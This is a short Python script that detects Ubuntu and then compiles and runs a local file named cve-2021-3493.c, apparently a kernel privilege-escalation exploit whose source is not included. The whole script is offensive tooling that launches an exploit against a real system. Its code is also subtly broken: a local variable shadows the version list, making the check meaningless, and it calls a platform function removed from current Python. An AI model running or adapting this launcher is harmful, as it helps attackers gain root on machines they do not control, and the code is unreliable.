import subprocess
import platform

system_info = platform.uname()
version = ["20.10", "20.04", "19.04", "18.04", "16.04", "14.04"]
def check():
    os_version = platform.linux_distribution()
    version = os_version[1]
    if system_info.system == 'Linux':
        # Check if it's Ubuntu
        if 'ubuntu' in system_info.version.lower() and version in version:
            exploit()

def exploit():
    subprocess.run(["gcc", "-o", "cve-2021-3493", "cve-2021-3493.c"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    subprocess.run(["./cve-2021-3493"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)